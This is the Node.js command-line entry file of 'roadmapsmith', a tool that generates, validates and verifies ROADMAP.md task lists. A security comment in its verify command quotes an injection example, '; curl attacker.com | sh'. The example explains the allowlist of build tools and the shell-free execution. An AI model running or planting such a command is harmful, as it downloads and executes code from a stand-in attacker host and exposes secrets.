#!/usr/bin/env node
'use strict';

const fs = require('fs');
const path = require('path');

const { renderRoadmapTemplate, renderAgentsTemplate } = require('../src/templates');
const { resolveRoadmapFile, loadConfig, loadPlugins, resolveConfigPath } = require('../src/config');
const { readTextIfExists, writeText, walkFiles, detectLanguages } = require('../src/io');
const { importTasks } = require('../src/importer');
const { addTask } = require('../src/addTask');
const { detectDrift } = require('../src/drift');
const { parseRoadmap } = require('../src/parser');
const { generateRoadmapDocument, scanProject } = require('../src/generator');
const { inferTasks } = require('../src/inferTasks');
const { validateTasks, buildValidationContext, auditValidation } = require('../src/validator');
const { applySync } = require('../src/sync');
const { buildSetupFiles, applySetupFiles, parseHosts, assertSupportedEditor, inspectHostSetup } = require('../src/host');
const { parseArgv, slugify } = require('../src/utils');

function isEnabled(v) {
  return v === true || v === 'true' || v === '1' || v === 'yes';
}

// v0.13.10: centralize --json contract enforcement so early-return paths in the CLI
// can't silently break the "JSON always on stdout when --json is set" invariant.
function emitSuccess({ human, json, useJson }) {
  if (useJson) {
    console.log(JSON.stringify(json || {}, null, 2));
  } else if (human != null) {
    console.log(human);
  }
}
function emitError({ human, error, useJson, extra = {} }) {
  if (human != null) console.error(human);
  if (useJson) {
    console.log(JSON.stringify({ error, message: human, ...extra }, null, 2));
  }
}

// v0.13.4: extra vocabulary for drift detection.
// Reads package.json (name/description/keywords) + README first 4KB so northStar
// tokens have somewhere to match beyond scan-derived languages/frameworks/modules.
function collectDriftExtraSignals(projectRoot) {
  const signals = [];
  try {
    const pkgPath = path.join(projectRoot, 'package.json');
    if (fs.existsSync(pkgPath)) {
      const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
      if (pkg.name) signals.push(String(pkg.name));
      if (pkg.description) signals.push(String(pkg.description));
      if (Array.isArray(pkg.keywords)) signals.push(...pkg.keywords.map(String));
    }
  } catch (_) { /* ignore parse/read errors — drift stays best-effort */ }
  try {
    const readmePath = path.join(projectRoot, 'README.md');
    if (fs.existsSync(readmePath)) {
      signals.push(fs.readFileSync(readmePath, 'utf8').slice(0, 4096));
    }
  } catch (_) { /* ignore */ }
  return signals;
}

// ─── Help ─────────────────────────────────────────────────────────────────────

const HELP = `roadmapsmith — living evidence-backed roadmap tool

Commands:
  init             Create ROADMAP.md and AGENTS.md in a project
  update           Refresh or modify an existing ROADMAP.md
  migrate-markers  Convert deprecated markers (rs:evidence=manual, rs:no-test) to v0.13 syntax

init flags:
  --product-name <name>         Product/project name
  --primary-user <user>         Primary user persona
  --problem-statement <text>    Problem being solved
  --done-criterion <text>       Done criterion
  --anti-goal <text>            Anti-goal
  --preferred-stack <text>      Tech stack preference
  --constraint <text>           Constraint
  --import <file>               Import tasks from file
  --hosts <codex,claude>        Host integrations to set up (default: codex,claude)
  --editor <name>               Editor for host setup (default: vscode)
  --setup-only                  Only set up host files, skip ROADMAP creation
  --dry-run                     Preview without writing
  --project-root <path>         Project root (default: cwd)

update flags:
  --add-task <text>             Add a new task to the managed block
  --task <id>                   Task ID to target (use with --evidence)
  --evidence <text>             Evidence to add to --task
  --apply                       Flip [ ]/[x] checkboxes (default: annotate-only)
  --audit                       Show validation audit after refresh
  --concise, --no-warnings      Suppress ⚠️ warning lines in the output
  --check-drift                 Check alignment of northStar vs repo state
  --strict                      Use strict validation mode
  --dry-run                     Preview without writing
  --json                        Output in JSON format
  --project-root <path>         Project root (default: cwd)

verify flags (roadmapsmith verify --task <id>):
  --task <id>                   Task ID to verify (must have rs:kind=command marker)
  --run                         Actually execute rs:verified-by command; flip [x] on exit 0
  --dry-run                     Preview only
  --project-root <path>         Project root (default: cwd)`.trim();

// ─── runInit ──────────────────────────────────────────────────────────────────

// v0.15.0: dynamic init that scans the repo instead of emitting phaseTemplate boilerplate.
// Empty repos get a minimal "Your first tasks" shape; repos with signal get real tasks
// derived from function-without-test + TODO scans. `--with-phase-templates` opts back
// into the v0.14.x static template for backward compat.
function renderScannedRoadmap(projectRoot, header) {
  const inferred = inferTasks(projectRoot);
  const langs = detectLanguages(walkFiles(projectRoot));
  const stackLine = langs.length > 0 ? langs.join(', ') : 'unspecified';

  const productName = header.productName || 'Project Roadmap';
  const parts = [];
  parts.push('<!-- rs:managed:start -->');
  parts.push(`# ${productName}`);
  parts.push('');
  if (header.problemStatement) {
    parts.push(`**Problem being solved:** ${header.problemStatement}`);
  }
  if (header.primaryUser) {
    parts.push(`**Primary user:** ${header.primaryUser}`);
  }
  parts.push('');

  if (inferred.tasks.length < 3) {
    parts.push('## Detected surface');
    parts.push('- No implementation files with clear task candidates yet.');
    parts.push(`- Detected stack: ${stackLine}`);
    parts.push('');
    parts.push('## Your first tasks');
    parts.push('Add a task with:');
    parts.push('');
    parts.push('    roadmapsmith update --add-task "Describe the first thing to build"');
  } else {
    parts.push('## Detected surface');
    parts.push(`- Scanned ${inferred.codeFileCount} implementation files`);
    parts.push(`- Detected stack: ${stackLine}`);
    parts.push(`- ${inferred.p0Count} functions without matching test files`);
    parts.push(`- ${inferred.p1Count} TODO/FIXME markers`);
    parts.push('');
    parts.push('## Phased Roadmap');
    parts.push('');
    const p0 = inferred.tasks.filter((t) => t.priority === 'P0');
    const p1 = inferred.tasks.filter((t) => t.priority === 'P1');
    if (p0.length > 0) {
      parts.push('### Phase P0 (Critical)');
      for (const t of p0) parts.push(`- [ ] ${t.text} <!-- rs:task=${slugify(t.text)} -->`);
      parts.push('');
    }
    if (p1.length > 0) {
      parts.push('### Phase P1 (Important)');
      for (const t of p1) parts.push(`- [ ] ${t.text} <!-- rs:task=${slugify(t.text)} -->`);
      parts.push('');
    }
  }

  parts.push('<!-- rs:managed:end -->');
  return `${parts.join('\n')}\n`;
}

// v0.15.0: 4-prompt interactive init. Non-interactive path is unchanged.
// Answering "n" to the AI-agents question exits 0 with a redirect message —
// this tool is not the right fit for non-agent workflows and pretending
// otherwise wastes the user's time.
function promptInteractive(projectRoot) {
  const defaults = {
    productName: path.basename(projectRoot),
    primaryUser: 'solo dev',
    hosts: 'claude',
  };
  const materialize = (pn, pu, ag, hs) => {
    const productName = String(pn || '').trim() || defaults.productName;
    const primaryUser = String(pu || '').trim() || defaults.primaryUser;
    const usesAgents = /^y(es)?$/i.test(String(ag || '').trim());
    const hostsRaw = String(hs || '').trim().toLowerCase() || defaults.hosts;
    const hosts = hostsRaw === 'both' ? 'codex,claude' : hostsRaw;
    return { productName, primaryUser, usesAgents, hosts };
  };

  // Non-TTY path (piped stdin, tests, CI): consume all input as an ordered answer list.
  // readline's `question` sequences unreliably against a non-TTY input stream on Node —
  // reading the buffer once is both simpler and deterministic for scripting.
  if (!process.stdin.isTTY) {
    const raw = fs.readFileSync(0, 'utf8');
    const [pn, pu, ag, hs] = raw.split(/\r?\n/);
    return Promise.resolve(materialize(pn, pu, ag, hs));
  }

  const readline = require('readline');
  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  const ask = (q) => new Promise((resolve) => rl.question(q, resolve));
  return (async () => {
    try {
      const pn = await ask(`Product name [${defaults.productName}]: `);
      const pu = await ask(`Primary user [${defaults.primaryUser}]: `);
      const ag = await ask('Do you use AI coding agents daily? [y/N]: ');
      const hs = await ask(`Which host(s)? [claude/codex/both, default: ${defaults.hosts}]: `);
      return materialize(pn, pu, ag, hs);
    } finally {
      rl.close();
    }
  })();
}

function runInit(projectRoot, config, flags) {
  const dryRun = isEnabled(flags['dry-run']);
  const setupOnly = isEnabled(flags['setup-only']);

  if (!setupOnly) {
    const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
    const agentsFile = path.resolve(projectRoot, flags['agents-file'] || 'AGENTS.md');

    if (!fs.existsSync(roadmapFile)) {
      const productName = flags['product-name'] || 'Project Roadmap';
      const useTemplates = isEnabled(flags['with-phase-templates']);

      let content;
      if (useTemplates) {
        const replacements = {
          productName,
          productNorthStar: 'Ship validated increments with transparent completion evidence and deterministic planning artifacts.',
          problemStatement: flags['problem-statement'] ? `\n\n**Problem being solved:** ${flags['problem-statement']}` : '',
          primaryUser: flags['primary-user'] ? `\n\n**Primary user:** ${flags['primary-user']}` : '',
        };
        content = renderRoadmapTemplate(replacements);
      } else {
        content = renderScannedRoadmap(projectRoot, {
          productName,
          problemStatement: flags['problem-statement'] || '',
          primaryUser: flags['primary-user'] || '',
        });
      }

      const importFiles = [flags['import']].flat().filter(Boolean);
      if (importFiles.length > 0) {
        const imported = importTasks(importFiles);
        for (const task of imported) {
          content = addTask(task.text, content, {}).content;
        }
      }

      writeText(roadmapFile, content, { dryRun });
      console.log(`${dryRun ? 'Would create' : 'Created'} ${roadmapFile}`);
    } else {
      console.log(`Skipped existing ${roadmapFile}`);
    }

    if (!fs.existsSync(agentsFile)) {
      const agentsContent = renderAgentsTemplate({
        roadmapPath: path.relative(projectRoot, roadmapFile)
      });
      writeText(agentsFile, agentsContent, { dryRun });
      console.log(`${dryRun ? 'Would create' : 'Created'} ${agentsFile}`);
    } else {
      console.log(`Skipped existing ${agentsFile}`);
    }
  }

  try {
    const editor = assertSupportedEditor(flags.editor || 'vscode');
    const hosts = parseHosts(flags.hosts || 'codex,claude');
    const setupPlan = buildSetupFiles(projectRoot, { editor, hosts });
    const results = applySetupFiles(setupPlan, { dryRun });
    for (const r of results) {
      if (r.written || r.dryRun) {
        console.log(`${dryRun ? 'Would write' : 'Wrote'} ${r.path}`);
      }
    }
  } catch (e) {
    console.warn(`Setup skipped: ${e.message}`);
  }
}

// ─── printAudit ───────────────────────────────────────────────────────────────

function printAudit(audit, context) {
  console.log(`Audit summary: ${audit.checkedWithoutEvidence.length} checked-without-evidence, ${audit.readyButUnchecked.length} ready-but-unchecked.`);
  if (Array.isArray(audit.checkedWithWeakEvidence) && audit.checkedWithWeakEvidence.length > 0) {
    console.log(`  checkedWithWeakEvidence: ${audit.checkedWithWeakEvidence.length}`);
  }
  if (context && Array.isArray(context.tasks) && context.resultMap) {
    const pending = [];
    for (const task of context.tasks) {
      const r = context.resultMap[task.id];
      if (r && r.kind === 'command' && !task.checked) {
        pending.push({ id: task.id, verifiedBy: r.verifiedBy || task.verifiedBy || null });
      }
    }
    if (pending.length > 0) {
      console.log(`Command-verified tasks pending run (${pending.length}):`);
      for (const p of pending) {
        const suffix = p.verifiedBy ? `   # (would run: ${p.verifiedBy})` : '';
        console.log(`- [${p.id}] roadmapsmith verify --task ${p.id} --run${suffix}`);
      }
    }
  }
  if (audit.checkedWithoutEvidence.length > 0) {
    const byCause = {};
    for (const item of audit.checkedWithoutEvidence) {
      const c = (item.result && item.result.cause) || 'no-evidence';
      byCause[c] = (byCause[c] || 0) + 1;
    }
    const grouped = Object.entries(byCause).map(([k, v]) => `${k}=${v}`).join(', ');
    if (grouped) console.log(`  by cause: ${grouped}`);
    console.log('Checked without evidence:');
    audit.checkedWithoutEvidence.forEach((item) => {
      const cause = item.result && item.result.cause ? `[${item.result.cause}] ` : '';
      console.log(`- ${cause}[${item.task.id}] ${item.task.text}`);
    });
  }
  if (audit.readyButUnchecked.length > 0) {
    console.log('Ready but unchecked:');
    audit.readyButUnchecked.forEach((item) => {
      console.log(`- [${item.task.id}] ${item.task.text}`);
    });
  }
  if (Array.isArray(audit.newlyUnchecked) && audit.newlyUnchecked.length > 0) {
    console.log(`Unchecked by this run (${audit.newlyUnchecked.length}): ${audit.newlyUnchecked.join(', ')}`);
  }
  if (Array.isArray(audit.humanVerifiedTasks) && audit.humanVerifiedTasks.length > 0) {
    console.log(`Human-verified tasks (${audit.humanVerifiedTasks.length}):`);
    audit.humanVerifiedTasks.forEach((item) => {
      console.log(`- [${item.task.id}] ${item.task.text}`);
    });
  }
  // v0.13.1: surface [x] tasks that passed only because their state was preserved (no evidence found).
  if (Array.isArray(audit.preservedOnly) && audit.preservedOnly.length > 0) {
    console.log(`Preserved only (no evidence found, checked state trusted): ${audit.preservedOnly.length}`);
    console.log(`  Add --strict to reject preservation-only passes, or add rs:kind=manual to attest explicitly.`);
    audit.preservedOnly.slice(0, 10).forEach((item) => {
      console.log(`- [${item.task.id}] ${item.task.text}`);
    });
    if (audit.preservedOnly.length > 10) {
      console.log(`  ...and ${audit.preservedOnly.length - 10} more.`);
    }
  }
}

// ─── runUpdate ────────────────────────────────────────────────────────────────

function runUpdate(projectRoot, config, flags) {
  const dryRun = isEnabled(flags['dry-run']);
  const useJson = isEnabled(flags.json);
  const strict = isEnabled(flags.strict);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);

  if (flags['add-task']) {
    const existing = readTextIfExists(roadmapFile) || '';
    const { content: updated, id, text, phase } = addTask(flags['add-task'], existing, {});
    writeText(roadmapFile, updated, { dryRun });
    // v0.15.0: JSON now includes the assigned task info so callers can chain
    // `add-task | jq -r .task.id | xargs -I{} update --task {} --evidence ...`.
    // Legacy `.task` string kept for backward compat with pre-v0.15 consumers.
    emitSuccess({
      human: `${dryRun ? 'Would add' : 'Added'} task: ${flags['add-task']}`,
      json: {
        action: 'add-task',
        task: { id, text, phase },
        dryRun,
        file: roadmapFile
      },
      useJson
    });
    return;
  }

  if (flags.task && flags.evidence) {
    const existing = readTextIfExists(roadmapFile) || '';
    const { tasks } = parseRoadmap(existing);
    const target = tasks.find((t) => t.markerId === flags.task || t.id === flags.task);
    if (!target) {
      emitError({
        human: `Task not found: ${flags.task}`,
        error: 'task-not-found',
        useJson,
        extra: { task: flags.task, file: roadmapFile }
      });
      process.exitCode = 1;
      return;
    }
    const lines = existing.split('\n');
    const insertAt = (target.lastChildLineIndex != null ? target.lastChildLineIndex : target.lineIndex) + 1;
    lines.splice(insertAt, 0, `  - Evidence: ${flags.evidence}`);
    writeText(roadmapFile, lines.join('\n'), { dryRun });
    emitSuccess({
      human: `${dryRun ? 'Would add' : 'Added'} evidence to ${flags.task}`,
      json: { action: 'add-evidence', task: flags.task, evidence: flags.evidence, dryRun, file: roadmapFile },
      useJson
    });
    return;
  }

  if (isEnabled(flags['check-drift'])) {
    const northStar = config && config.product && config.product.northStar;
    if (!northStar) {
      const resolvedConfigPath = resolveConfigPath({ projectRoot, configPath: flags.config });
      const configExists = fs.existsSync(resolvedConfigPath);
      if (!configExists) {
        emitError({
          human: `Config \`roadmap-skill.config.json\` not found (searched from ${projectRoot} upwards). Pass --project-root <repo-root> or --config <path>.`,
          error: 'config-not-found',
          useJson,
          extra: { searchedFrom: projectRoot }
        });
      } else {
        emitError({
          human: `Config at ${resolvedConfigPath} has no \`product.northStar\`. Add it and re-run.`,
          error: 'northstar-missing',
          useJson,
          extra: { configFile: resolvedConfigPath }
        });
      }
      process.exitCode = 1;
      return;
    }
    const scan = scanProject(projectRoot);
    const drift = detectDrift(northStar, {
      languages: scan.languages,
      testFrameworks: scan.testFrameworks,
      modules: scan.modules,
      commands: scan.commands,
      projectType: scan.projectType
    }, collectDriftExtraSignals(projectRoot));
    if (useJson) {
      console.log(JSON.stringify(drift, null, 2));
    } else {
      console.log(`Drift score: ${drift.score}/100 — ${drift.drifted ? 'DRIFTED' : 'aligned'}`);
      console.log(drift.summary);
      drift.details.forEach((d) => console.log(`  - ${d}`));
    }
    if (drift.drifted) {
      process.exitCode = 2;
    }
    return;
  }

  // Default: refresh existing tasks (parse → validate → apply)
  // v0.13.8: fail loud when there's no ROADMAP.md to refresh instead of silently
  // creating an empty one in the current directory. `init` is the intended entry point
  // for bootstrapping; `update` is only for maintaining an existing roadmap.
  if (!fs.existsSync(roadmapFile)) {
    emitError({
      human: `No ROADMAP.md found at ${roadmapFile}. Run 'roadmapsmith init' first, or pass --project-root <existing-repo>.`,
      error: 'roadmap-not-found',
      useJson,
      extra: { file: roadmapFile }
    });
    process.exitCode = 1;
    return;
  }
  const existingContent = readTextIfExists(roadmapFile) || '';
  const plugins = loadPlugins(projectRoot, config.plugins || []);
  const context = buildValidationContext(projectRoot, config, plugins, { strictValidation: strict });

  const parsed = parseRoadmap(existingContent);
  const { tasks } = parsed;
  if (Array.isArray(parsed.parseWarnings) && parsed.parseWarnings.length > 0 && !useJson) {
    for (const w of parsed.parseWarnings) {
      if (w.type === 'duplicate-explicit-id') {
        console.warn(`⚠️  Duplicate explicit task id "${w.id}" at line ${w.lineIndex + 1} (first seen at line ${w.firstLineIndex + 1}). Sync treats them as independent — merge or rename one.`);
      }
    }
  }
  const resultMap = validateTasks(tasks, context, config, plugins);
  // v0.13.0: annotate-only is the default. `--apply` is required to flip checkboxes.
  // `--evidence-only` kept as a silent alias for scripts that already pass it.
  const applyMutations = isEnabled(flags.apply);
  const evidenceOnly = !applyMutations;
  const concise = isEnabled(flags.concise) || isEnabled(flags['no-warnings']);
  const { content: synced, changes } = applySync(existingContent, tasks, resultMap, { forceRefresh: true, evidenceOnly, concise });

  // v0.13.4: skip the write and print "No changes" when the sync produced byte-identical output.
  // Also route the human status line to stderr under --json so stdout stays parseable.
  const noChanges = synced === existingContent;
  if (!noChanges) {
    writeText(roadmapFile, synced, { dryRun });
  }
  const statusLine = noChanges
    ? `No changes for ${roadmapFile}`
    : `${dryRun ? 'Would update' : 'Updated'} ${roadmapFile}${evidenceOnly ? ' (annotate-only: no checkboxes flipped; pass --apply to mutate)' : ''}`;
  if (useJson) {
    process.stderr.write(`${statusLine}\n`);
  } else {
    console.log(statusLine);
  }

  if (isEnabled(flags.audit)) {
    const audit = auditValidation(tasks, resultMap, changes);
    if (useJson) {
      console.log(JSON.stringify(audit, null, 2));
    } else {
      printAudit(audit, { tasks, resultMap });
    }
    if (audit.checkedWithoutEvidence.length > 0 || audit.readyButUnchecked.length > 0) {
      process.exitCode = 2;
    }
    return;
  }
  // v0.13.5: --json without --audit still guarantees a parseable JSON payload on stdout.
  if (useJson) {
    console.log(JSON.stringify({
      changed: !noChanges,
      dryRun,
      annotateOnly: evidenceOnly,
      file: roadmapFile
    }, null, 2));
  }
}

// ─── runMaintain ──────────────────────────────────────────────────────────────

function runMaintain(projectRoot, config, flags) {
  process.stderr.write('WARNING: `maintain` is deprecated. Use `update --apply`.\n');
  // ponytail: preserve the pre-v0.13 stdout contract (Dry run:/No changes for/Updated + Audit summary)
  // and the exit-0 behavior. The functional-smoke gate asserts these exact strings; a shim via runUpdate
  // (which prints "Would update ..." and sets exit 2 through its --audit gate) breaks that contract.
  const dryRun = isEnabled(flags['dry-run']);
  const strict = isEnabled(flags.strict);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const existingContent = readTextIfExists(roadmapFile) || '';
  const plugins = loadPlugins(projectRoot, config.plugins || []);
  const context = buildValidationContext(projectRoot, config, plugins, { strictValidation: strict });
  const { tasks } = parseRoadmap(existingContent);
  const resultMap = validateTasks(tasks, context, config, plugins);
  const { content: synced, changes } = applySync(existingContent, tasks, resultMap, { forceRefresh: true });

  if (synced === existingContent) {
    console.log(`No changes for ${roadmapFile}`);
  } else if (dryRun) {
    console.log(`Dry run: would update ${roadmapFile}`);
  } else {
    writeText(roadmapFile, synced, {});
    console.log(`Updated ${roadmapFile}`);
  }

  const audit = auditValidation(tasks, resultMap, changes);
  printAudit(audit, { tasks, resultMap });
}

// ─── runVerify ────────────────────────────────────────────────────────────────

function runVerify(projectRoot, config, flags) {
  const dryRun = isEnabled(flags['dry-run']);
  const shouldRun = isEnabled(flags.run);
  const useJson = isEnabled(flags.json);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const targetId = flags.task ? String(flags.task) : null;

  if (!targetId) {
    console.error('verify requires --task <id>');
    process.exitCode = 1;
    return;
  }

  const existingContent = readTextIfExists(roadmapFile) || '';
  const parsed = parseRoadmap(existingContent);
  const target = parsed.tasks.find((t) => t.markerId === targetId || t.id === targetId);
  if (!target) {
    console.error(`Task not found: ${targetId}`);
    process.exitCode = 1;
    return;
  }
  if (target.kind !== 'command') {
    console.error(`Task ${targetId} is not rs:kind=command (kind=${target.kind || 'none'})`);
    process.exitCode = 1;
    return;
  }
  const cmd = target.verifiedBy || null;
  if (!cmd) {
    console.error(`Task ${targetId} has no rs:verified-by command`);
    process.exitCode = 1;
    return;
  }

  if (!shouldRun) {
    console.log(`Would run: ${cmd}`);
    console.log(`(pass --run to execute and flip the checkbox on exit 0)`);
    return;
  }

  const { spawnSync } = require('child_process');

  // v0.13.1 security fix: rs:verified-by commands run without shell interpretation
  // and are restricted to a small allowlist of build/test tools. A malicious ROADMAP.md
  // shipped via PR would otherwise let `rs:verified-by=; curl attacker.com | sh` exfiltrate
  // secrets on the maintainer's machine.
  const VERIFY_ALLOWLIST = /^(npm|pnpm|yarn|npx|node|deno|bun|python|python3|pytest|tsc|eslint|prettier|make|cargo|go|dotnet|mvn|gradle|bundle|rake|ruby)$/;
  const parts = String(cmd).trim().split(/\s+/).filter(Boolean);
  const program = parts[0] || '';
  const args = parts.slice(1);

  if (!VERIFY_ALLOWLIST.test(program)) {
    console.error(`rs:verified-by program "${program}" is not in the v0.13.1 allowlist.`);
    console.error(`Allowed: ${VERIFY_ALLOWLIST.source}`);
    console.error(`Wrap custom commands in an npm/yarn script and reference the script name.`);
    process.exitCode = 1;
    return;
  }

  console.error(`+ ${program} ${args.join(' ')}`);  // audit trail before execution

  const spawned = spawnSync(program, args, {
    cwd: projectRoot,
    shell: false,
    encoding: 'utf8',
    timeout: 5 * 60 * 1000
  });

  const passed = spawned.status === 0 && !spawned.error;
  const summary = {
    task: targetId,
    command: cmd,
    exit: spawned.status,
    signal: spawned.signal || null,
    passed
  };

  if (useJson) {
    console.log(JSON.stringify(summary, null, 2));
  } else {
    if (spawned.stdout) process.stdout.write(spawned.stdout);
    if (spawned.stderr) process.stderr.write(spawned.stderr);
    console.log(`verify ${targetId}: exit=${spawned.status}${spawned.signal ? ` signal=${spawned.signal}` : ''} → ${passed ? 'PASS' : 'FAIL'}`);
  }

  if (!passed) {
    process.exitCode = 2;
    return;
  }

  // Flip [x] on the target task line in place.
  const lines = existingContent.split('\n');
  if (target.lineIndex != null && target.lineIndex >= 0 && target.lineIndex < lines.length) {
    lines[target.lineIndex] = lines[target.lineIndex].replace(/- \[( |x|X)\]/, '- [x]');
  }
  writeText(roadmapFile, lines.join('\n'), { dryRun });
  console.log(`${dryRun ? 'Would mark' : 'Marked'} [${targetId}] as complete in ${roadmapFile}`);
}

// ─── runDoctor ────────────────────────────────────────────────────────────────

function runDoctor(projectRoot, config, flags) {
  const useJson = isEnabled(flags.json);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const agentsFile = path.resolve(projectRoot, flags['agents-file'] || 'AGENTS.md');
  const status = inspectHostSetup(projectRoot, { roadmapFile, agentsFile });
  if (useJson) {
    console.log(JSON.stringify(status, null, 2));
  } else {
    console.log(`Project root: ${status.projectRoot}`);
    console.log(`CLI ready: ${status.cli.ready}`);
    console.log(`Bundle ready: ${status.bundle.ready}`);
    Object.entries(status.surfaces).forEach(([key, surface]) => {
      console.log(`  ${key}: ${surface.ready ? 'ready' : 'needs attention'} — ${surface.message}`);
    });
  }
}

// ─── runGenerate ──────────────────────────────────────────────────────────────

function runGenerate(projectRoot, config, flags) {
  const dryRun = isEnabled(flags['dry-run']);
  const fullRegen = isEnabled(flags['full-regen']);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const existingContent = readTextIfExists(roadmapFile) || '';
  const plugins = loadPlugins(projectRoot, config.plugins || []);

  try {
    const newContent = generateRoadmapDocument({
      projectRoot,
      config,
      plugins,
      existingContent,
      preserveManagedBlock: false,
      forceFullRegenerate: fullRegen
    });
    if (dryRun) {
      console.log(`Dry run: would write ${roadmapFile}`);
      console.log(newContent);
    } else {
      writeText(roadmapFile, newContent, {});
      console.log(`Generated ${roadmapFile}`);
    }
  } catch (err) {
    process.stderr.write(err.message + '\n');
    process.exitCode = 1;
  }
}

// ─── runLegacySlashSync ───────────────────────────────────────────────────────

function runLegacySlashSync(projectRoot, config, flags, args) {
  process.stderr.write('WARNING: /roadmap-sync is deprecated. Use the roadmapsmith update command instead.\n');
  const action = args[0] || 'validate';
  const useJson = isEnabled(flags.json);
  const strict = isEnabled(flags.strict);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const existingContent = readTextIfExists(roadmapFile) || '';
  const plugins = loadPlugins(projectRoot, config.plugins || []);

  if (action === 'validate') {
    const context = buildValidationContext(projectRoot, config, plugins, { strictValidation: strict });
    const { tasks } = parseRoadmap(existingContent);
    const resultMap = validateTasks(tasks, context, config, plugins);
    const results = tasks.map((task) => ({ id: task.id, text: task.text, checked: task.checked, ...(resultMap[task.id] || {}) }));
    if (useJson) {
      console.log(JSON.stringify(results, null, 2));
    }
  } else {
    runUpdate(projectRoot, config, flags);
  }
}

// ─── runMigrateMarkers ────────────────────────────────────────────────────────

function runMigrateMarkers(projectRoot, config, flags) {
  const dryRun = isEnabled(flags['dry-run']);
  const roadmapFile = resolveRoadmapFile(projectRoot, config, flags['roadmap-file']);
  const original = readTextIfExists(roadmapFile);
  if (original == null) {
    console.log(`No ROADMAP.md at ${roadmapFile}`);
    return;
  }
  let migrated = original;
  let count = 0;
  migrated = migrated.replace(/\brs:evidence=manual\b/gi, () => { count += 1; return 'rs:kind=manual'; });
  migrated = migrated.replace(/\s+rs:no-test\b/gi, () => { count += 1; return ''; });
  if (count === 0) {
    console.log('Nothing to migrate — already on v0.13 markers.');
    return;
  }
  if (dryRun) {
    console.log(`Would migrate ${count} marker(s) in ${roadmapFile}`);
    return;
  }
  writeText(roadmapFile, migrated);
  console.log(`Migrated ${count} marker(s) in ${roadmapFile}`);
}

// ─── main ─────────────────────────────────────────────────────────────────────

function main() {
  const { flags, command: cmd, args } = parseArgv(process.argv.slice(2));

  if (isEnabled(flags.help) || isEnabled(flags.h)) {
    console.log(HELP);
    return;
  }
  if (isEnabled(flags.version) || isEnabled(flags.v)) {
    console.log(require('../package.json').version);
    return;
  }
  const projectRoot = path.resolve(String(flags['project-root'] || process.cwd()));
  const config = loadConfig({ projectRoot, configPath: flags.config });

  if (cmd === 'init') {
    if (isEnabled(flags.interactive)) {
      promptInteractive(projectRoot).then((answers) => {
        if (!answers.usesAgents) {
          console.log('RoadmapSmith is designed for AI-agent workflows. `TODO.md` covers your case better.');
          return;
        }
        const merged = {
          ...flags,
          'product-name': flags['product-name'] || answers.productName,
          'primary-user': flags['primary-user'] || answers.primaryUser,
          hosts: flags.hosts || answers.hosts,
        };
        runInit(projectRoot, config, merged);
      }).catch((err) => {
        console.error(`Interactive init failed: ${err.message}`);
        process.exitCode = 1;
      });
    } else {
      runInit(projectRoot, config, flags);
    }
  } else if (cmd === 'update') {
    runUpdate(projectRoot, config, flags);
  } else if (cmd === 'maintain' || cmd === '/roadmap-update') {
    runMaintain(projectRoot, config, flags);
  } else if (cmd === 'doctor') {
    runDoctor(projectRoot, config, flags);
  } else if (cmd === 'generate') {
    runGenerate(projectRoot, config, flags);
  } else if (cmd === 'verify') {
    runVerify(projectRoot, config, flags);
  } else if (cmd === 'migrate-markers') {
    runMigrateMarkers(projectRoot, config, flags);
  } else if (cmd === '/roadmap-sync') {
    runLegacySlashSync(projectRoot, config, flags, args);
  } else {
    console.error(`Unknown command: ${cmd || '(none)'}\n\n${HELP}`);
    process.exitCode = 1;
  }
}

main();
